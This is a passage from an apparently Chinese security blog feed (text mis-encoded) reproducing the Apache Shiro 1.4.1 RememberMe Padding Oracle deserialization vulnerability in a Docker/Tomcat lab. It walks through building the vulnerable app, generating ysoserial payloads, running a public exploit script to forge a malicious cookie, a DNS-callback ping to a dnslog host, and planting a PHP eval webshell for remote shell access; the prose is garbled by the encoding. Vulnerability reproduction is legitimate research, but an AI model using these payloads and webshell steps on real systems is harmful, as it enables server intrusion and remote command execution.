href="#é€šè¿‡è‡ªè¡Œç¼–è¯‘1-4-1war-åŒ…æ”¾å…¥tomcatå®¹å™¨ä¸­è¿è¡Œ" class="headerlink" title="é€šè¿‡è‡ªè¡Œç¼–è¯‘1.4.1war åŒ…æ”¾å…¥tomcatå®¹å™¨ä¸­è¿è¡Œ"></a>é€šè¿‡è‡ªè¡Œç¼–è¯‘1.4.1war åŒ…æ”¾å…¥tomcatå®¹å™¨ä¸­è¿è¡Œ</h4><p>å®‰è£…maven</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://downloads.apache.org/maven/maven-<span class="hljs-number">3</span>/<span class="hljs-number">3</span>.<span class="hljs-number">6</span>.<span class="hljs-number">3</span>/binaries/apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">6</span>.<span class="hljs-number">3</span>-bin.tar.gz<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133119100.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> zxvf  apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">6</span>.<span class="hljs-number">3</span>-bin.tar.gz  -C  /usr/local<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133234604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ·»åŠ ç¯å¢ƒå˜é‡</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">vi /etc/profile<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">MAVEN_HOME</span>=/usr/local/apache-maven-3.6.3<br><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$MAVEN_HOME</span>/bin:$PATH <br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133359541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿›å…¥çˆ¶bashæŸ¥çœ‹mvnç‰ˆæœ¬</p><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> <span class="hljs-regexp">/etc/</span>profile<br>mvn -v <br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133509501.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">vim  <span class="hljs-meta-keyword">/usr/</span>local/apache-maven<span class="hljs-number">-3.6</span><span class="hljs-number">.3</span><span class="hljs-meta-keyword">/conf/</span>settings.xml<br>æ‰¾åˆ°mirrorsèŠ‚ç‚¹æ·»åŠ é˜¿é‡Œé•œåƒåº“åœ°å€ï¼š<br><span class="hljs-params">&lt;mirrors&gt;</span><br>    <span class="hljs-params">&lt;mirror&gt;</span><br>      <span class="hljs-params">&lt;id&gt;</span>alimaven<span class="hljs-params">&lt;/id&gt;</span><br>      <span class="hljs-params">&lt;name&gt;</span>aliyun maven<span class="hljs-params">&lt;/name&gt;</span><br>      <span class="hljs-params">&lt;url&gt;</span>http:<span class="hljs-comment">//maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;</span><br>      <span class="hljs-params">&lt;mirrorOf&gt;</span>central<span class="hljs-params">&lt;/mirrorOf&gt;</span>        <br>    <span class="hljs-params">&lt;/mirror&gt;</span><br>  <span class="hljs-params">&lt;/mirrors&gt;</span><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2021062013361645.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä» Apache Shiro Gtihub å®˜æ–¹ä»“åº“è‡ªè¡Œä¸‹è½½æ¼æ´å½±å“ç‰ˆæœ¬(<a href="https://github.com/apache/shiro)%EF%BC%8C%E4%BD%BF%E7%94%A8">https://github.com/apache/shiro)ï¼Œä½¿ç”¨</a> Apache Maven(è½¯ä»¶é¡¹ç›®ç®¡ç†åŠè‡ªåŠ¨æ„å»ºå·¥å…·) ç¼–è¯‘æ„å»ºç”Ÿæˆ war Java åº”ç”¨ç¨‹åºåŒ…ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apache/</span>shiro.git<br></code></pre></div></td></tr></table></figure><p>ç„¶ååœ¨æ‰§è¡Œ</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> shiro<br><span class="hljs-attribute">git</span> checkout shiro-root-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>åˆ°è¿™åˆ™æ­å»ºçš„æ²¡æœ‰é—®é¢˜<br><img src="https://img-blog.csdnimg.cn/20210620133711170.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç„¶å</p><figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm"><span class="hljs-symbol">cd</span> samples/web<br><span class="hljs-keyword">mvn</span> install<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210620133930385.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å°†ç¼–è¯‘å®Œæˆè·å–åˆ°çš„ samples-web-1.4.1.war åŒ…( samples/target/ä¸­ï¼‰æ‹·è´åˆ° Tomcat çš„ webapps ç›®å½•ä¸‹ï¼Œå¯åŠ¨tomcatå³å¯ã€‚ä½¿ç”¨å‘½ä»¤</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">sudo docker cp è™šæ‹Ÿæœºé‡Œçš„warç»å¯¹è·¯å¾„ dockerå®¹å™¨ID:<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/tomcat/</span>webapps<br></code></pre></div></td></tr></table></figure><p>ç„¶åæ‰“å¼€http://è‡ªå·±è™šæ‹Ÿæœºçš„IP:9000/samples-web-1.4.1/</p><p><img src="https://img-blog.csdnimg.cn/20210620134413592.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="æµ‹è¯•ä¸ç»“æœ"><a href="#æµ‹è¯•ä¸ç»“æœ" class="headerlink" title="æµ‹è¯•ä¸ç»“æœ"></a>æµ‹è¯•ä¸ç»“æœ</h3><h4 id="å¤ç°æ­¥éª¤ï¼š"><a href="#å¤ç°æ­¥éª¤ï¼š" class="headerlink" title="å¤ç°æ­¥éª¤ï¼š"></a>å¤ç°æ­¥éª¤ï¼š</h4><h6 id="è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•ç½‘ç«™ï¼ˆå‹¾é€‰Rememberï¼‰ï¼Œå¹¶ä»cookieä¸­è·å–RememberMeå€¼ã€‚"><a href="#è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•ç½‘ç«™ï¼ˆå‹¾é€‰Rememberï¼‰ï¼Œå¹¶ä»cookieä¸­è·å–RememberMeå€¼ã€‚" class="headerlink" title="è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•ç½‘ç«™ï¼ˆå‹¾é€‰Rememberï¼‰ï¼Œå¹¶ä»cookieä¸­è·å–RememberMeå€¼ã€‚"></a>è¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•ç½‘ç«™ï¼ˆå‹¾é€‰Rememberï¼‰ï¼Œå¹¶ä»cookieä¸­è·å–RememberMeå€¼ã€‚</h6><h6 id="ä½¿ç”¨RememberMe-cookieä½œä¸ºPadding-Oracle-Attackçš„å‰ç¼€ã€‚"><a href="#ä½¿ç”¨RememberMe-cookieä½œä¸ºPadding-Oracle-Attackçš„å‰ç¼€ã€‚" class="headerlink" title="ä½¿ç”¨RememberMe cookieä½œä¸ºPadding Oracle Attackçš„å‰ç¼€ã€‚"></a>ä½¿ç”¨RememberMe cookieä½œä¸ºPadding Oracle Attackçš„å‰ç¼€ã€‚</h6><h6 id="åŠ å¯†ysoserialçš„åºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½ï¼Œä»¥é€šè¿‡Padding-Oracle-Attackåˆ¶ä½œç²¾å¿ƒåˆ¶ä½œçš„RememberMeã€‚"><a href="#åŠ å¯†ysoserialçš„åºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½ï¼Œä»¥é€šè¿‡Padding-Oracle-Attackåˆ¶ä½œç²¾å¿ƒåˆ¶ä½œçš„RememberMeã€‚" class="headerlink" title="åŠ å¯†ysoserialçš„åºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½ï¼Œä»¥é€šè¿‡Padding Oracle Attackåˆ¶ä½œç²¾å¿ƒåˆ¶ä½œçš„RememberMeã€‚"></a>åŠ å¯†ysoserialçš„åºåˆ—åŒ–æœ‰æ•ˆè´Ÿè½½ï¼Œä»¥é€šè¿‡Padding Oracle Attackåˆ¶ä½œç²¾å¿ƒåˆ¶ä½œçš„RememberMeã€‚</h6><h6 id="è¯·æ±‚å¸¦æœ‰æ–°çš„RememberMe-cookieçš„ç½‘ç«™ï¼Œä»¥æ‰§è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚"><a href="#è¯·æ±‚å¸¦æœ‰æ–°çš„RememberMe-cookieçš„ç½‘ç«™ï¼Œä»¥æ‰§è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚" class="headerlink" title="è¯·æ±‚å¸¦æœ‰æ–°çš„RememberMe cookieçš„ç½‘ç«™ï¼Œä»¥æ‰§è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚"></a>è¯·æ±‚å¸¦æœ‰æ–°çš„RememberMe cookieçš„ç½‘ç«™ï¼Œä»¥æ‰§è¡Œååºåˆ—åŒ–æ”»å‡»ã€‚</h6><h6 id="æ”»å‡»è€…æ— éœ€çŸ¥é“RememberMeåŠ å¯†çš„å¯†ç å¯†é’¥ã€‚"><a href="#æ”»å‡»è€…æ— éœ€çŸ¥é“RememberMeåŠ å¯†çš„å¯†ç å¯†é’¥ã€‚" class="headerlink" title="æ”»å‡»è€…æ— éœ€çŸ¥é“RememberMeåŠ å¯†çš„å¯†ç å¯†é’¥ã€‚"></a>æ”»å‡»è€…æ— éœ€çŸ¥é“RememberMeåŠ å¯†çš„å¯†ç å¯†é’¥ã€‚</h6><h4 id="æ¼æ´å¤ç°ï¼š"><a href="#æ¼æ´å¤ç°ï¼š" class="headerlink" title="æ¼æ´å¤ç°ï¼š"></a>æ¼æ´å¤ç°ï¼š</h4><h5 id="ä¸€-æ¼æ´åˆ©ç”¨å¤ç°01"><a href="#ä¸€-æ¼æ´åˆ©ç”¨å¤ç°01" class="headerlink" title="ä¸€.æ¼æ´åˆ©ç”¨å¤ç°01"></a>ä¸€.æ¼æ´åˆ©ç”¨å¤ç°01</h5><p>ç™»å½• Shiro æµ‹è¯•è´¦æˆ·è·å–åˆæ³• Cookieï¼ˆå‹¾é€‰Remember Meï¼‰ï¼š</p><p><img src="https://img-blog.csdnimg.cn/20210620184816156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è®¤è¯å¤±è´¥æ—¶ï¼ˆè¾“å…¥é”™è¯¯çš„ç”¨æˆ·åå’Œå¯†ç ï¼‰ï¼Œhttpå“åº”é¡µé¢ä¸­ä¼šæ˜¾ç¤ºå‡ºdeleteMeçš„cookie:</p><p><img src="https://img-blog.csdnimg.cn/20210620185017886.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¾“å…¥æ­£ç¡®ç”¨æˆ·å¯†ç å¾—åˆ°åˆæ³•cookieï¼š</p><p><img src="https://img-blog.csdnimg.cn/20210620190024434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è®¤è¯æˆåŠŸï¼ˆè¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ç™»å½•ï¼‰ï¼Œhttpå“åº”é¡µé¢ä¸­ä¸ä¼šæ˜¾ç¤ºdeleteMeçš„cookie:</p><p><img src="https://img-blog.csdnimg.cn/202106201903079.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ ¹æ®ä»¥ä¸Šæ¡ä»¶æˆ‘ä»¬çš„æ€è·¯æ˜¯åœ¨æ­£å¸¸åºåˆ—åŒ–æ•°æ®ï¼ˆéœ€è¦ä¸€ä¸ªå·²çŸ¥çš„ç”¨æˆ·å‡­è¯è·å–æ­£å¸¸åºåˆ—åŒ–æ•°æ®ï¼‰ååˆ©ç”¨ Padding Oracle æ„é€ æˆ‘ä»¬è‡ªå·±çš„æ•°æ®ï¼ˆJavaåºåˆ—åŒ–æ•°æ®åçš„è„æ•°æ®ä¸å½±å“ååºåˆ—åŒ–ç»“æœï¼‰ï¼Œæ­¤æ—¶ä¼šæœ‰ä¸¤ä¸­æƒ…å†µ:</p><p>æ„é€ çš„æ•°æ®ä¸èƒ½é€šè¿‡å­—ç¬¦å¡«å……éªŒè¯ï¼Œè¿”å›deleteme;<br>æ„é€ çš„æ•°æ®å¯ä»¥æˆåŠŸè§£å¯†é€šè¿‡å­—ç¬¦å¡«å……éªŒè¯ï¼Œä¹‹åæ•°æ®å¯ä»¥æ­£å¸¸ååºåˆ—åŒ–ï¼Œä¸è¿”å›deletemeçš„cookie.<br>è¿™é‡Œè¾“å…¥æ­£ç¡®çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå¹¶å‹¾é€‰Remeber MEã€‚</p><p>ç™»å½•æˆåŠŸåï¼Œè®¿é—®<a href="http://192.168.1.14:8080/account/%EF%BC%8CF12%E5%BE%97%E5%88%B0Cookie%E4%B8%AD%E7%9A%84rememberMe%E5%80%BC">http://192.168.1.14:8080/account/ï¼ŒF12å¾—åˆ°Cookieä¸­çš„rememberMeå€¼</a><br><img src="https://img-blog.csdnimg.cn/20210620190609805.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h4 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h4><h4 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h4><p>ä½¿ç”¨Javaååºåˆ—åŒ–å·¥å…· ysoserial ç”Ÿæˆ Payload:</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>  -jar ysoserial-master-<span class="hljs-number">6</span>eca<span class="hljs-number">5</span>bc<span class="hljs-number">740</span>-<span class="hljs-number">1</span>.jar   CommonsCollections<span class="hljs-number">1</span> &#x27;touch /tmp/test&#x27; &gt; payload.class<br></code></pre></div></td></tr></table></figure><p>é€šè¿‡gitå¯¹å…¶padding oracle attack  pocè¿›è¡Œä¸‹è½½</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone  https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/wuppp/</span>shiro_rce_exp.git<br></code></pre></div></td></tr></table></figure><p>é€šè¿‡ Padding Oracle Attack ç”Ÿæˆ Evil Rememberme cookie:<br>æ­¤ exp çˆ†ç ´æ—¶é—´è¾ƒé•¿ï¼Œå»ºè®®ä½¿ç”¨ ysoserial ç”Ÿæˆè¾ƒçŸ­çš„ payload éªŒè¯ï¼ˆå¦‚ï¼š ping ã€ touch /tmp/testç­‰ï¼‰ï¼Œç”ŸæˆæˆåŠŸåå°†è‡ªåŠ¨åœæ­¢è¿è¡Œã€‚</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">ä¹Ÿå¯ç”¨<span class="hljs-keyword">python</span>è‡ªåŠ¨åŒ–è„šæœ¬<br><span class="hljs-keyword">cp</span> payload.class  shiro_rce_exp/<br><span class="hljs-keyword">cd</span> shiro_rce_exp/<br><span class="hljs-keyword">python</span> shiro_exp.<span class="hljs-keyword">py</span> http://è‡ªå·±çš„ip:dockerçš„ç«¯å£/account/ æ­¤å¤„ä¸ºä¸Šé¢è·å–Rememberme cookie payload.class<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210625224820201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20210625224946755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä½¿ç”¨Evil Rememberme cookie è®¤è¯è¿›è¡Œååºåˆ—åŒ–æ”»å‡»ï¼šå¤åˆ¶è¯¥cookieï¼Œç„¶åé‡æ”¾ä¸€ä¸‹æ•°æ®ï¼Œå³å¯æˆåŠŸæ‰§è¡Œå‘½ä»¤,æ­¤å¤„è„šæœ¬çˆ†ç ´å‡ºæ­£ç¡®çš„Rememberme cookieéœ€è¦è¾ƒé•¿æ—¶é—´ã€‚<br><img src="https://img-blog.csdnimg.cn/20210625225948360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿˜å¯ä»¥ç”¨dnslogæä¾›çš„dnsåœ°å€è§£ææ¥éªŒè¯</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>  -jar ysoserial-master-<span class="hljs-number">6</span>eca<span class="hljs-number">5</span>bc<span class="hljs-number">740</span>-<span class="hljs-number">1</span>.jar CommonsBeanutils<span class="hljs-number">1</span> <span class="hljs-string">&quot;ping y2xqmm.dnslog.cn&quot;</span> &gt; payload.class<br></code></pre></div></td></tr></table></figure><h4 id="æ–¹æ³•äºŒä½¿ç”¨shiro550-721æ¼æ´æ£€æŸ¥å·¥å…·å¯¹å…¶è¿›è¡ŒéªŒè¯"><a href="#æ–¹æ³•äºŒä½¿ç”¨shiro550-721æ¼æ´æ£€æŸ¥å·¥å…·å¯¹å…¶è¿›è¡ŒéªŒè¯" class="headerlink" title="æ–¹æ³•äºŒä½¿ç”¨shiro550/721æ¼æ´æ£€æŸ¥å·¥å…·å¯¹å…¶è¿›è¡ŒéªŒè¯"></a>æ–¹æ³•äºŒä½¿ç”¨shiro550/721æ¼æ´æ£€æŸ¥å·¥å…·å¯¹å…¶è¿›è¡ŒéªŒè¯</h4><p>å·¥å…·ä¸‹è½½åœ°å€ï¼š<br><a href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/download/v2.51/ShiroExploit.V2.51.7z">https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/download/v2.51/ShiroExploit.V2.51.7z</a></p><p><img src="https://img-blog.csdnimg.cn/20210626015025253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20210626142410269.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><img src="https://img-blog.csdnimg.cn/20210626020227297.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœ€åæœ‰åŠ å·å³å­˜åœ¨æ¼æ´</p><h4 id="ææƒshell"><a href="#ææƒshell" class="headerlink" title="ææƒshell"></a>ææƒshell</h4><p>ç”Ÿæˆpayloadç„¶åç”¨ä¸Šè¿°æ–¹æ³•è·å–æ¶æ„rememberkey</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">java</span>  -jar ysoserial-master-d<span class="hljs-number">367</span>e<span class="hljs-number">379</span>d<span class="hljs-number">9</span>-<span class="hljs-number">1</span>.jar  CommonsCollections<span class="hljs-number">1</span> &#x27;touch /usr/local/tomcat/webapps/samples-web-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span>/<span class="hljs-number">1</span>.php&#x27; &gt; payload<span class="hljs-number">2</span>.class<br><br><span class="hljs-attribute">java</span>  -jar ysoserial-master-d<span class="hljs-number">367</span>e<span class="hljs-number">379</span>d<span class="hljs-number">9</span>-<span class="hljs-number">1</span>.jar  CommonsCollections<span class="hljs-number">1</span> &#x27;echo <span class="hljs-string">&quot;&lt;?php eval($_POST[&quot;</span>cmd<span class="hljs-string">&quot;]);&quot;</span> &gt; /usr/local/tomcat/webapps/samples-web-<span class="hljs-number">1</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span>/<span class="hljs-number">1</span>.php&#x27; &gt; payload<span class="hljs-number">2</span>.class<br><br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210626141447776.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>é‡æ”¾ä¹‹åè¿›å…¥1.phpå¯çœ‹åˆ°å†…å®¹</p><p><img src="https://img-blog.csdnimg.cn/20210626142151449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æœ€åç”¨èšå‰‘è¿æ¥å³å¯ï¼Œæˆ–è€…ç›´æ¥shrioå·¥å…·åå¼¹shell</p><p><img src="https://img-blog.csdnimg.cn/20210626144042750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20210626152005550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhb2FtaWZpbmU=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>Shiro</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buuä¸Šå¼ºç½‘æ¯é«˜æ˜çš„é»‘å®¢</title>
    <link href="/2021/04/19/2021-4-19-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"/>
    <url>/2021/04/19/2021-4-19-%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
    
